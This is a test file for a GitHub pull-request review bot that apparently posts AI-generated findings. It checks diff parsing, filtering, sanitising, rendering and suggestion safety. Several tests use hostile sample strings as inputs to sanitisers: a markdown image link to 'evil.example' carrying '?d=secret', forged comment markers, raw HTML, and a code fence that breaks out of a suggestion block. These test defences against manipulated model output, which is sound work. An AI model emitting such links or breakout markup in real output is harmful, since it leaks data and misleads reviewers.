import { describe, expect, test } from "bun:test";
import { generateKeyPairSync, createVerify } from "node:crypto";
import { netReactions, outcomeFor } from "../src/cron/outcomes";
import { pickRedeliveries, type HookDelivery } from "../src/cron/redeliver";
import { createAppJwt } from "../src/github/client";
import type { Finding } from "../src/llm/types";
import { parsePatch } from "../src/pipeline/diff";
import { filterFiles } from "../src/pipeline/filter";
import { parseRenderedComment, renderComment, renderSummary } from "../src/pipeline/render";
import { parseRepoConfig, skipReason } from "../src/pipeline/repo-config";
import {
  dropCopiedLines,
  fingerprint,
  rangeInDiff,
  safeSuggestion,
  sanitize,
  validateFindings,
} from "../src/pipeline/validate";

const PATCH = `@@ -1,4 +1,6 @@
 export function add(a: number, b: number) {
-  return a - b;
+  return a + b;
 }
+
+export const answer = 42;
\\ No newline at end of file`;

describe("parsePatch", () => {
  test("knows which new-file lines GitHub accepts comments on", () => {
    const d = parsePatch(PATCH);
    expect([...d.added]).toEqual([2, 4, 5]);
    expect([...d.commentable.keys()].sort()).toEqual([1, 2, 3, 4, 5]);
    expect(d.commentable.get(2)).toBe("  return a + b;");
  });

  test("handles several hunks", () => {
    const d = parsePatch("@@ -1,1 +1,1 @@\n-a\n+b\n@@ -10,2 +10,3 @@\n x\n+y\n z");
    expect([...d.added]).toEqual([1, 11]);
  });
});

describe("filterFiles", () => {
  const file = (filename: string, extra: object = {}) => ({ filename, status: "modified", additions: 1, deletions: 0, patch: "@@ -1 +1 @@\n+x", ...extra });
  test("drops lockfiles, generated code, binaries, deletions and ignored paths", () => {
    const { review, skipped } = filterFiles(
      [
        file("src/app.ts"),
        file("bun.lock"),
        file("web/dist/app.js"),
        file("logo.png", { patch: undefined }),
        file("old.ts", { status: "removed" }),
        file("migrations/001.sql"),
      ],
      ["migrations/**"],
    );
    expect(review.map((f) => f.filename)).toEqual(["src/app.ts"]);
    expect(Object.fromEntries(skipped.map((s) => [s.path, s.reason]))).toEqual({
      "bun.lock": "generated or lockfile",
      "web/dist/app.js": "generated or lockfile",
      "logo.png": "binary or too large to diff",
      "old.ts": "deleted",
      "migrations/001.sql": "ignored by config",
    });
  });
});

describe(".selfreview.yml", () => {
  test("missing file → defaults", () => {
    expect(parseRepoConfig(null).config.min_severity).toBe("medium");
  });
  test("invalid values fall back to defaults with a visible warning", () => {
    const { config, warning } = parseRepoConfig("min_severity: critical");
    expect(config.min_severity).toBe("medium");
    expect(warning).toContain(".selfreview.yml ignored");
  });
  test("repo skips: drafts, bot authors, labels", () => {
    const { config } = parseRepoConfig("skip_labels: [wip]");
    expect(skipReason(config, { draft: true, author: "a", labels: [] })).toBe("draft");
    expect(skipReason(config, { draft: false, author: "renovate[bot]", labels: [] })).toBe("author:renovate[bot]");
    expect(skipReason(config, { draft: false, author: "a", labels: ["wip"] })).toBe("label:wip");
    expect(skipReason(config, { draft: false, author: "a", labels: [] })).toBeNull();
  });
});

const finding = (over: Partial<Finding> = {}): Finding => ({
  path: "src/math.ts", line: 2, severity: "high", category: "bug", title: "Subtraction instead of addition", body: "Fix it.", ...over,
});

describe("validateFindings", () => {
  const diffs = new Map([["src/math.ts", parsePatch(PATCH)]]);
  const opts = { minSeverity: "medium" as const, maxComments: 2 };

  test("keeps findings on diff lines, moves the rest to the summary", () => {
    const r = validateFindings([finding(), finding({ line: 40, title: "elsewhere" })], diffs, [], opts);
    expect(r.post.map((f) => f.line)).toEqual([2]);
    expect(r.outsideDiff.map((f) => f.line)).toEqual([40]);
  });

  test("drops findings on files this review never looked at (a made-up path)", () => {
    const r = validateFindings([finding({ path: "`@someone` ![x](https://evil.example)" })], diffs, [], opts);
    expect(r.post).toEqual([]);
    expect(r.outsideDiff).toEqual([]);
    expect(r.dropped[0]?.reason).toBe("unknown file");
  });

  test("titles become one line, so the comment can be recognised on the next push", () => {
    const r = validateFindings([finding({ title: "Subtraction\ninstead of   addition" })], diffs, [], opts);
    expect(r.post[0]?.title).toBe("Subtraction instead of addition");
  });

  test("drops low severity, repeats of earlier findings, and anything past the cap", () => {
    const first = validateFindings([finding()], diffs, [], opts).post[0]!;
    const r = validateFindings(
      [finding(), finding({ severity: "low", line: 5, title: "nit" }), finding({ line: 5, category: "security", title: "a" }), finding({ line: 4, category: "performance", title: "b" })],
      diffs,
      [{ path: first.path, line: first.line, category: first.category, fingerprint: first.fingerprint }],
      opts,
    );
    expect(r.dropped.map((d) => d.reason).sort()).toEqual(["already raised", "below min_severity"]);
    expect(r.post).toHaveLength(2);
  });

  test("the same issue a few lines away (after a push) is still recognised", () => {
    const r = validateFindings([finding({ line: 4 })], diffs, [{ path: "src/math.ts", line: 2, category: "bug", fingerprint: "other" }], opts);
    expect(r.dropped[0]?.reason).toBe("already raised");
  });

  test("fingerprints ignore title punctuation and case but not the code", () => {
    expect(fingerprint(finding({ title: "Off-by-one!" }), "x")).toBe(fingerprint(finding({ title: "off by one" }), "x"));
    expect(fingerprint(finding(), "x")).not.toBe(fingerprint(finding(), "y"));
  });
});

describe("sanitize (model output is untrusted)", () => {
  test("neutralises mentions, images, raw HTML and forged markers", () => {
    const out = sanitize('ping @octocat ![x](https://evil.example/?d=secret) <img src=x> <!-- selfreview:sha=abc -->');
    expect(out).not.toContain("@octocat");
    expect(out).toContain("@​octocat");
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("<img");
    expect(out).not.toContain("selfreview:sha");
  });
});

describe("render", () => {
  test("a posted comment can be read back after a crash", () => {
    const body = renderComment({ ...finding(), fingerprint: "0123456789ab" });
    expect(parseRenderedComment(body)).toEqual({ fingerprint: "0123456789ab", severity: "high", category: "bug", title: "Subtraction instead of addition" });
  });
  test("long lists in the summary are cut, so it stays under GitHub's size limit", () => {
    const skippedFiles = Array.from({ length: 1200 }, (_, i) => ({ path: `vendor/lib/file-${i}.js`, reason: "generated or lockfile" }));
    const s = renderSummary({
      sha: "abcdef1234", posted: [], outsideDiff: [], skippedFiles,
      filesReviewed: 1, model: "openrouter:z-ai/glm-5.3", costUsd: 0,
    });
    expect(s).toContain("Not reviewed (1200)");
    expect(s).toContain("…and 1150 more");
    expect(s.length).toBeLessThan(10_000);
  });
  test("summary says what was reviewed and what wasn't", () => {
    const s = renderSummary({
      sha: "abcdef1234", posted: [], outsideDiff: [], skippedFiles: [{ path: "bun.lock", reason: "generated or lockfile" }],
      filesReviewed: 1, model: "openrouter:z-ai/glm-5.3", costUsd: 0,
    });
    expect(s).toContain("<!-- selfreview:summary -->");
    expect(s).toContain("no new findings");
    expect(s).toContain("`bun.lock`: generated or lockfile");
  });
});

describe("GitHub App JWT", () => {
  test("is an RS256 JWT for this app, valid ≤ 10 minutes, verifiable with the public key", () => {
    const { privateKey, publicKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
    const pem = privateKey.export({ type: "pkcs1", format: "pem" }).toString(); // GitHub's format
    const jwt = createAppJwt(123, pem, 1_700_000_000_000);
    const [h, p, sig] = jwt.split(".");
    const payload = JSON.parse(Buffer.from(p!, "base64url").toString());
    expect(JSON.parse(Buffer.from(h!, "base64url").toString())).toEqual({ alg: "RS256", typ: "JWT" });
    expect(payload.iss).toBe("123");
    expect(payload.exp - payload.iat).toBeLessThanOrEqual(600);
    expect(createVerify("RSA-SHA256").update(`${h}.${p}`).verify(publicKey, sig!, "base64url")).toBe(true);
  });
});

describe("pickRedeliveries", () => {
  const now = Date.parse("2026-10-10T12:00:00Z");
  const d = (id: number, guid: string, status_code: number, minutesAgo: number): HookDelivery => ({
    id, guid, status_code, event: "pull_request", redelivery: false, delivered_at: new Date(now - minutesAgo * 60_000).toISOString(),
  });

  test("resends the latest failed attempt of deliveries we never recorded", () => {
    const picks = pickRedeliveries([d(3, "a", 502, 5), d(2, "a", 0, 20), d(1, "b", 202, 30)], new Set(), now);
    expect(picks.map((p) => p.id)).toEqual([3]);
  });

  test("skips what we already recorded, what later succeeded, old ones, and hopeless ones", () => {
    const picks = pickRedeliveries(
      [
        d(1, "recorded", 500, 5),
        d(2, "fixed", 500, 20), d(3, "fixed", 200, 10),
        d(4, "ancient", 500, 7 * 60),
        ...Array.from({ length: 12 }, (_, i) => d(10 + i, "hopeless", 500, 5 + i * 10)),
      ],
      new Set(["recorded"]),
      now,
    );
    expect(picks).toEqual([]);
  });
});

describe("suggestions (accepting one replaces the lines)", () => {
  const diff = parsePatch("@@ -1,2 +1,3 @@\n const link = make();\n+this.links.set(slug, link);\n return link;");
  const f = (suggestion: string, end_line?: number): Finding => ({ ...finding({ path: "a.ts", line: 2 }), suggestion, end_line });

  test("kept when it rewrites the line and keeps what it replaces", () => {
    expect(safeSuggestion(f("if (!this.links.has(slug)) {\nthis.links.set(slug, link);\n}"), diff)).toBe(true);
  });
  test("dropped when accepting it would delete the original line (an 'insert before' written as a replacement)", () => {
    expect(safeSuggestion(f('if (this.links.has(slug)) throw new Error("taken");'), diff)).toBe(false);
  });
  test("dropped for long or out-of-diff ranges", () => {
    expect(safeSuggestion(f("x", 40), diff)).toBe(false);
  });
  test("dropped when it contains a code fence (it would break out of the suggestion block)", () => {
    expect(safeSuggestion(f("this.links.set(slug, link);\n```\n![x](https://evil.example/t.png)"), diff)).toBe(false);
  });
  test("dropped when accepting it would change nothing", () => {
    expect(safeSuggestion(f("this.links.set(slug, link);"), diff)).toBe(false);
  });
});

describe("suggestions that copy the lines around them", () => {
  const diff = parsePatch(
    "@@ -1,2 +1,4 @@\n const link = make();\n+if (link) {\n+this.links.set(slug, link);\n+}\n return link;",
  );
  const f = (line: number, suggestion: string): Finding => ({ ...finding({ path: "a.ts", line }), suggestion });

  test("lines copied from after the range are removed, so accepting it doesn't add them twice", () => {
    const copied = "this.links.set(slug, link);\nlog(slug);\n}\nreturn link;";
    expect(dropCopiedLines(copied, f(3, copied), diff)).toBe("this.links.set(slug, link);\nlog(slug);");
  });
  test("lines copied from before the range are removed too", () => {
    const copied = "const link = make();\nif (link && slug) {";
    expect(dropCopiedLines(copied, f(2, copied), diff)).toBe("if (link && slug) {");
  });
  test("a closing bracket that matches the next line stays (it can be new code)", () => {
    const wrapped = "if (slug) {\nthis.links.set(slug, link);\n}";
    expect(dropCopiedLines(wrapped, f(3, wrapped), diff)).toBe(wrapped);
  });
  test("the whole pipeline posts the trimmed suggestion", () => {
    const copied = "this.links.set(slug, link);\nlog(slug);\n}\nreturn link;";
    const opts = { minSeverity: "medium" as const, maxComments: 10 };
    const r = validateFindings([f(3, copied)], new Map([["a.ts", diff]]), [], opts);
    expect(r.post[0]?.suggestion).toBe("this.links.set(slug, link);\nlog(slug);");
  });
});

describe("comment outcomes", () => {
  test("resolved beats addressed beats open", () => {
    expect(outcomeFor({ isResolved: true, isOutdated: true })).toBe("resolved");
    expect(outcomeFor({ isResolved: false, isOutdated: true })).toBe("addressed");
    expect(outcomeFor({ isResolved: false, isOutdated: false })).toBe("open");
  });
  test("reactions count 👍 minus 👎 and ignore the rest", () => {
    expect(
      netReactions([
        { content: "THUMBS_UP", reactors: { totalCount: 3 } },
        { content: "THUMBS_DOWN", reactors: { totalCount: 1 } },
        { content: "HEART", reactors: { totalCount: 5 } },
      ]),
    ).toBe(2);
  });
});

describe("multi-line ranges (one bad range would make GitHub reject the whole review)", () => {
  const twoHunks = parsePatch("@@ -1,3 +1,3 @@\n a\n-b\n+B\n c\n@@ -20,2 +20,3 @@\n x\n+y\n z");
  const opts = { minSeverity: "medium" as const, maxComments: 10 };

  test("a range inside one hunk is kept", () => {
    expect(rangeInDiff(twoHunks, 1, 3)).toBe(true);
    const r = validateFindings([finding({ path: "a.ts", line: 1, end_line: 3, suggestion: "a\nB\nc" })], new Map([["a.ts", twoHunks]]), [], opts);
    expect(r.post[0]?.end_line).toBe(3);
  });

  test("an end outside the diff, or a range across hunks, falls back to a single line without the suggestion", () => {
    expect(rangeInDiff(twoHunks, 2, 20)).toBe(false);
    expect(rangeInDiff(twoHunks, 3, 2)).toBe(false);
    const r = validateFindings([finding({ path: "a.ts", line: 2, end_line: 21, suggestion: "B" })], new Map([["a.ts", twoHunks]]), [], opts);
    expect(r.post[0]?.line).toBe(2);
    expect(r.post[0]?.end_line).toBeUndefined();
    expect(r.post[0]?.suggestion).toBeUndefined();
  });
});
